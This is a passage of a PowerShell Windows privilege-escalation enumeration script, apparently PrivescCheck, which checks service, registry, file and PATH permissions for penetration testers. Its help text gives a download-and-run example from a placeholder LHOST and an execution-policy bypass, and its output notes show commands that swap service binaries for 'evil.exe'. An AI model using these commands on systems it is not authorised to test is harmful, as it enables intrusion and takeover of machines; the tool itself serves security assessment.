        $AppItem | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $CurrentFileFullname
        [void]$InstalledProgramsResult.Add($AppItem)
    }
    
    $InstalledProgramsResult
}

function Invoke-ModifiableProgramsCheck {
    <#
    .SYNOPSIS

    Identifies applications which have a modifiable EXE of DLL file

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For each non-default application, enumerates the .exe and .dll files that the current user has 
    modify permissions on.
    
    .EXAMPLE

    PS C:\> Invoke-ModifiableProgramsCheck | ft

    ModifiablePath                      IdentityReference    Permissions
    --------------                      -----------------    -----------
    C:\Program Files\VulnApp\Packages   DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    C:\Program Files\VulnApp\app.exe    DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    C:\Program Files\VulnApp\foobar.dll DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
    
    #>
    
    [CmdletBinding()] param()

    $Items = Get-InstalledPrograms -Filtered

    ForEach ($Item in $Items) {
        
        $SearchPath = New-Object -TypeName System.Collections.ArrayList
        [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*")) # Do this to avoid the use of -Depth which is PSH5+
        [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*\*")) # Do this to avoid the use of -Depth which is PSH5+
        
        $ChildItems = Get-ChildItem -Path $SearchPath -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
        #$ChildItems = $Item | Get-ChildItem -Recurse -Depth 2 -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
        
        if (-not $GetChildItemError) {

            $ChildItems | ForEach-Object {

                if ($_ -is [System.IO.DirectoryInfo]) {
                    $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths
                } else {
                    # Check only .exe and .dll ???
                    # TODO: maybe consider other extensions 
                    if ($_.FullName -Like "*.exe" -or $_.FullName -Like "*.dll") {
                        $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths 
                    }
                }

                if ($ModifiablePaths) {
                    ForEach ($Path in $ModifiablePaths) {
                        if ($Path.ModifiablePath -eq $_.FullName) {
                            $Path
                        }
                    }
                }
            }
        }
    }
}

function Invoke-RunningProcessCheck {
    <#
    .SYNOPSIS

    Enumerates the running processes

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First, it lists all the processes thanks to the built-in "Get-Process" function. Then, it 
    filters the result in order to return only the non-default Windows processes. By default,
    this function returns only process that are NOT owned by teh current user but you can 
    use the "-Self" flag to get them. 
    
    .PARAMETER Self

    Use this flag to get a list of all the process owned by the current user
    
    .EXAMPLE

    PS C:\> Invoke-RunningProcessCheck | ft

    Name                   PID User Path SessionId
    ----                   --- ---- ---- ---------
    cmd                   4224 N/A               1
    conhost               5336 N/A               1
    ctfmon                7436 N/A               1
    dllhost               3584 N/A               0
    dllhost               4172 N/A               1
    fontdrvhost            860 N/A               0
    fontdrvhost            928 N/A               1
    lsass                  732 N/A               0
    MsMpEng               3524 N/A               0
    MsMpEngCP             1132 N/A               0
    NisSrv                4256 N/A               0
    regedit               8744 N/A               1
    SearchFilterHost      9360 N/A               0
    SearchIndexer          596 N/A               0
    SearchProtocolHost      32 N/A               0
    SecurityHealthService 7980 N/A               0
    SgrmBroker            9512 N/A               0
    spoolsv               2416 N/A               0
    TabTip                7456 N/A               1
    wininit                564 N/A               0
    winlogon               676 N/A               1
    WmiPrvSE              3972 N/A               0

    #>
    
    [CmdletBinding()] param(
        [switch]
        $Self = $False
    )

    $CurrentUser = $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 

    $IgnoredProcessNames = @("Idle", "services", "Memory Compression", "TrustedInstaller", "PresentationFontCache", "Registry", "ServiceShell", "System", 
    "csrss", # Client/Server Runtime Subsystem
    "dwm", # Desktop Window Manager
    "msdtc", # Microsoft Distributed Transaction Coordinator
    "smss", # Session Manager Subsystem
    "svchost" # Service Host
    )

    $AllProcess = Get-Process 

    ForEach ($Process in $AllProcess) {

        if (-not ($IgnoredProcessNames -contains $Process.Name )) {

            $ProcessUser = (Get-UserFromProcess -ProcessId $Process.Id).DisplayName

            $ReturnProcess = $False

            if ($Self) {
                if ($ProcessUser -eq $CurrentUser) {
                    $ReturnProcess = $True 
                }
            } else {
                if (-not ($ProcessUser -eq $CurrentUser)) {

                    # Here, I check whether 'C:\Windows\System32\<PROC_NAME>.exe' exists
                    # Not ideal but it's a quick way to check whether it's a built-in binary.
                    # There might be some issues because of the FileSystem Redirector if the script is 
                    # run from a 32-bits instance of powershell.exe (-> SysWow64 instead of System32).
                    $PotentialImagePath = Join-Path -Path $env:SystemRoot -ChildPath "System32"
                    $PotentialImagePath = Join-Path -Path $PotentialImagePath -ChildPath "$($Process.name).exe"

                    # If we can't find it in System32, add it to the list 
                    if (-not (Test-Path -Path $PotentialImagePath)) {
                        $ReturnProcess = $True 
                    }
                    $ReturnProcess = $True 
                }
            }

            if ($ReturnProcess) {
                $RunningProcess = New-Object -TypeName PSObject 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Process.Name 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $Process.Id 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "User" -Value $(if ($ProcessUser) { $ProcessUser } else { "N/A" })
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Process.Path 
                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "SessionId" -Value $Process.SessionId
                $RunningProcess
            }

        } else {
            Write-Verbose "Ignored: $($Process.Name)"
        }
    }
}
# ----------------------------------------------------------------
# END INSTALLED PROGRAMS   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN SERVICES   
# ----------------------------------------------------------------
function Test-ServiceDaclPermission {
    <#
    .SYNOPSIS

    Tests one or more passed services or service names against a given permission set,
    returning the service objects where the current user have the specified permissions.

    Author: @harmj0y, Matthew Graeber (@mattifestation)
    License: BSD 3-Clause

    .DESCRIPTION

    Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
    a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
    user are enumerated services where the user has some type of permission are filtered. The
    services are then filtered against a specified set of permissions, and services where the
    current user have the specified permissions are returned.

    .PARAMETER Name

    An array of one or more service names to test against the specified permission set.

    .PARAMETER Permissions

    A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
    'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
    'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
    'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'

    .PARAMETER PermissionSet

    A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.

    .OUTPUTS

    ServiceProcess.ServiceController

    .EXAMPLE

    PS C:\> Get-Service | Test-ServiceDaclPermission

    Return all service objects where the current user can modify the service configuration.

    .EXAMPLE

    PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'

    Return all service objects that the current user can restart.


    .EXAMPLE

    PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'

    Return the VulnSVC object if the current user has start permissions.

    .LINK
    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    #>
    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }
        
        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            # We might not be able to access the Service at all so we must check whether Add-ServiceDacl returned something.
            if ($TargetService -and $TargetService.Dacl) { 

                # Enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                # Check all the Dacl objects of the current service 
                ForEach($ServiceDacl in $TargetService.Dacl) {

                    $MatchingDaclFound = $False

                    # A Dacl object contains two properties we want to check: a SID and a list of AccessRights 
                    # First, we want to check if the current Dacl SID is in the list of SIDs of the current user 
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {

                            # If a Permission Set was specified, we want to make sure that we have all the necessary access rights
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                                $MatchingDaclFound = $True 
                            }
                        } else {

                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    $MatchingDaclFound = $True 
                                    break
                                }
                            }
                        }
                    }

                    if ($MatchingDaclFound) {
                        # As soon as we find a matching Dacl, we can stop searching 
                        break
                    }
                }
            } else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}

function Invoke-InstalledServicesCheck {
    <#
    .SYNOPSIS

    Enumerates non-default services

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the custom "Get-ServiceList" function to get a filtered list of services that are 
    configured on the local machine. Then it returns each result in a custom PS object, 
    indicating the name, display name, binary path, user and start mode of the service.
    
    .EXAMPLE

    PS C:\> Invoke-InstalledServicesCheck | ft

    Name    DisplayName  ImagePath                                           User        StartMode
    ----    -----------  ---------                                           ----        ---------
    VMTools VMware Tools "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" LocalSystem Automatic

    #>
    
    [CmdletBinding()] param()

    $InstalledServicesResult = New-Object -TypeName System.Collections.ArrayList

    # Get only third-party services 
    $FilteredServices = Get-ServiceList -FilterLevel 3

    ForEach ($Service in $FilteredServices) {
        # Make a simplified version of the Service object, we only basic information for ths check.
        $ServiceItem = New-Object -TypeName PSObject 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $Service.DisplayName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $Service.StartMode
        #$ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $Service.Type
        [void]$InstalledServicesResult.Add($ServiceItem)
    }

    $InstalledServicesResult
}

function Invoke-ServicesPermissionsRegistryCheck {
    <#
    .SYNOPSIS

    Checks the permissions of the service settings in the registry

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The configuration of the services is maintained in the registry. Being able to modify these
    registry keys means being able to change the settings of a service. In addition, a complete
    machine reboot isn't necessary for these settings to be taken into account. Only the affected
    service needs to be restarted. 
    
    .EXAMPLE

    PS C:\> Invoke-ServicesPermissionsRegistryCheck 

    Name              : VulnService
    ImagePath         : C:\APPS\MyApp\service.exe
    User              : LocalSystem
    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
    IdentityReference : BUILTIN\Users
    Permissions       : {WriteOwner, Delete, ReadControl, ReadData/ListDirectory...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False

    #>
    
    [CmdletBinding()] param()
    
    # Get all services except the ones with an empty ImagePath or Drivers 
    $AllServices = Get-ServiceList -FilterLevel 2 

    ForEach ($Service in $AllServices) {

        Get-ModifiableRegistryPath -Path $Service.RegistryPath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {

            $Status = "Unknown"
            # Can we restart the service?
            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
    
            # Can we start the service?
            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}

function Invoke-ServicesUnquotedPathCheck {
    <#
    .SYNOPSIS

    Enumerates all the services with an unquoted path. For each one of them, enumerates paths that 
    the current user can modify. Based on the original "Get-ServiceUnquoted" function from 
    PowerUp. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    In my version of this function, I tried to eliminate as much false positives as possible.
    PowerUp tends to report "C:\" as exploitable whenever a program located in "C:\Program 
    Files" is identified. The problem is that we cannot write "C:\program.exe" so the service
    wouldn't be exploitable. We can only create folders in "C:\" by default.
    
    .EXAMPLE

    PS C:\> Invoke-ServicesUnquotedPathCheck

    Name              : VulnService
    ImagePath         : C:\APPS\My App\service.exe
    User              : LocalSystem
    ModifiablePath    : C:\APPS
    IdentityReference : NT AUTHORITY\Authenticated Users
    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()] param()

    # Get all services which have a non-empty ImagePath
    $Services = Get-ServiceList -FilterLevel 1
    
    $PermissionsAddFile = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
    $PermissionsAddFolder = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")

    ForEach ($Service in $Services) {
        $ImagePath = $Service.ImagePath.trim()

        # If the ImagePath doesn't start with a " or a ' 
        if (-not ($ImagePath.StartsWith("`"") -or $ImagePath.StartsWith("'"))) {
            
            # Extract the binpath from the ImagePath
            $BinPath = $ImagePath.SubString(0, $ImagePath.ToLower().IndexOf(".exe") + 4)

            # If the binpath contains spaces 
            If ($BinPath -match ".* .*") {
                $ModifiableFiles = $BinPath.split(' ') | Get-ModifiablePath

                $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                     
                    $TempPath = $([System.Environment]::ExpandEnvironmentVariables($BinPath))
                    $TempPath = Split-Path -Path $TempPath -Parent 
                    while ($TempPath) 
                    {
                        try {
                            $ParentPath = Split-Path -Path $TempPath -Parent 
                            if ($ParentPath -eq $_.ModifiablePath) {
                                $PermissionsSet = $Null 
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # If the current folder exists, can we create files in it?
                                    #"Folder $($TempPath) exists, can we create files in $($ParentPath)???"
                                    $PermissionsSet = $PermissionsAddFile
                                } else {
                                    # The current folder doesn't exist, can we create it? 
                                    #"Folder $($TempPath) doesn't exist, can we create the folder $($ParentPath)???"
                                    $PermissionsSet = $PermissionsAddFolder 
                                }
                                ForEach ($Permission in $_.Permissions) {
                                    if ($PermissionsSet -contains $Permission) {

                                        $Status = "Unknown"
                                        # Can we restart the service?
                                        $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
                                        if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
                                
                                        # Can we start the service?
                                        $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
                                        if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

                                        $ServiceItem = New-Object -TypeName PSObject 
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
                                        $ServiceItem

                                        break
                                    }
                                }
                                # We found the path returned by Get-ModifiablePath so we can exit the while loop 
                                break
                            }
                        } catch {
                            # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                            # exit safely to avoid an infinite loop 
                            break 
                        }
                        $TempPath = $ParentPath
                    }
                }
            }
        }
    }
}

function Invoke-ServicesImagePermissionsCheck {
    <#
    .SYNOPSIS

    Enumerates all the services that have a modifiable binary (or argument)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    FIrst, it enumerates the services thanks to the custom "Get-ServiceList" function. For each
    result, it checks the permissions of the ImagePath setting thanks to the "Get-ModifiablePath"
    function. Each result is returned in a custom PS object. 
    
    .EXAMPLE

    PS C:\> Invoke-ServicesImagePermissionsCheck

    Name              : VulneService
    ImagePath         : C:\APPS\service.exe
    User              : LocalSystem
    ModifiablePath    : C:\APPS\service.exe
    IdentityReference : NT AUTHORITY\Authenticated Users
    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()] param()
    
    $Services = Get-ServiceList -FilterLevel 1

    ForEach ($Service in $Services) {

        $Service.ImagePath | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
            
            $Status = "Unknown"
            # Can we restart the service?
            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
    
            # Can we start the service?
            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}

function Invoke-ServicesPermissionsCheck {
    <#
    .SYNOPSIS

    Enumerates the services the current can modify through the service manager. In addition, it 
    shows whether the service can be started/restarted. 
    
    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION

    This is based on the original "Get-ModifiableService" from PowerUp.
    
    .LINK

    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

    #>
    
    [CmdletBinding()] param()

    # Get-ServiceList returns a list of custom Service objects 
    # The properties of a custom Service object are: Name, DisplayName, User, ImagePath, StartMode, Type, RegsitryKey, RegistryPath 
    # We also apply the FilterLevel 1 to filter out services which have an empty ImagePath 
    $Services = Get-ServiceList -FilterLevel 1

    # For each custom Service object in the list 
    ForEach ($Service in $Services) {

        # Get a 'real' Service object and the associated DACL, based on its name 
        $TargetService = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'ChangeConfig'

        if ($TargetService) {

            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True } else { $UserCanRestart = $False }

            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject  
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $TargetService.Status 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}
# ----------------------------------------------------------------
# END SERVICES   
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN DLL HIJACKING   
# ----------------------------------------------------------------
function Invoke-DllHijackingCheck {
    <#
    .SYNOPSIS

    Checks whether any of the system path folders is modifiable

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First, it reads the system environment PATH from the registry. Then, for each entry, it checks
    whether the current user has write permissions.

    #>
    
    [CmdletBinding()] param()
    
    $SystemPath = (Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path 
    $Paths = $SystemPath.Split(';')

    ForEach ($Path in $Paths) {
        if ($Path -and $Path -ne '') {
            $Path | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $_
            }
        }
    }
}
# ----------------------------------------------------------------
# END DLL HIJACKING   
# ----------------------------------------------------------------
#endregion Checks

# ----------------------------------------------------------------
# Main  
# ----------------------------------------------------------------
#region Main
function Invoke-PrivescCheck {
    <#
    .SYNOPSIS

    Enumerates common security misconfigurations that can be exploited of privilege escalation
    pourposes. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This script aims to identify security misconfigurations that are relevant for privilege 
    escalation. It also provides some additional information that may help penetration testers to 
    choose between several potential exploits. For example, if you find that a service is 
    vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know
    hos often the machine is rebooted (in the case of a server). If you see that it is rebooted 
    every night for instance, you may want to attempt an exploit. 
    
    .EXAMPLE

    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 

    .EXAMPLE 

    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE

    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-P
    rivescCheck.ps1'; Invoke-PrivescCheck" 

    #>

    [CmdletBinding()] param()

    ### This check was taken from PowerUp.ps1
    # https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges! Safely exiting."

        # We don't want to continue, otherwise the script will identify almost everything as 
        # exploitable and thus generate a loooot of output. 
        return
    }

    "----------------------------------------------------------------"
    "|                         CURRENT USER                         |"
    "----------------------------------------------------------------"

    "TEST: whoami"
    "DESC: What's my username / SID?"
    "NOTE: 'My name is...'"
    $Results = Invoke-UserCheck
    if ($Results) {
        "[*] Found some info:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: whoami /groups"
    "DESC: Do I belong to any interesting group(s)?"
    "NOTE: Additional groups give you additional privileges."
    $Results = Invoke-UserGroupsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) non-default group(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: whoami /priv"
    "DESC: Do I have any interesting privilege(s)?"
    "NOTE: Privileges such as SeImpersonate or SeAssignPrimaryToken might allow you to run code as SYSTEM."
    $Results = Invoke-UserPrivilegesCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) potentially interesting privilege(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                           SERVICES                           |"
    "----------------------------------------------------------------"

    "TEST: Listing non-default services..."
    "DESC: Is there any non-defaut / third-party service?"
    "NOTE: Security holes are often caused by third-party software."
    $Results = Invoke-InstalledServicesCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] Found $(([object[]]$Results).Length) service(s)."
        $Results | Select-Object -Property Name,DisplayName | Format-Table
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking service permissions..."
    "DESC: Can we modify the configuration of any service through the Service Control Manager?"
    "NOTE: sc.exe config VulnService binpath= C:\Temp\evil.exe"
    $Results = Invoke-ServicesPermissionsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) vulnerable service(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking service permissions (registry)..."
    "DESC: Can we modify the configuration of any service in the Registry?"
    "NOTE: reg.exe add HKLM\[...]\Services\VulnService /v ImagePath /d C:\Temp\evil.exe /f"
    $Results = Invoke-ServicesPermissionsRegistryCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`n"
    
    "TEST: Checking service executable and argument permissions..."
    "DESC: Can we modify the executable itself or can we somehow control one of its arguments?"
    "NOTE: copy C:\Temp\evil.exe C:\APPS\MyCustomApp\service.exe"
    $Results = Invoke-ServicesImagePermissionsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

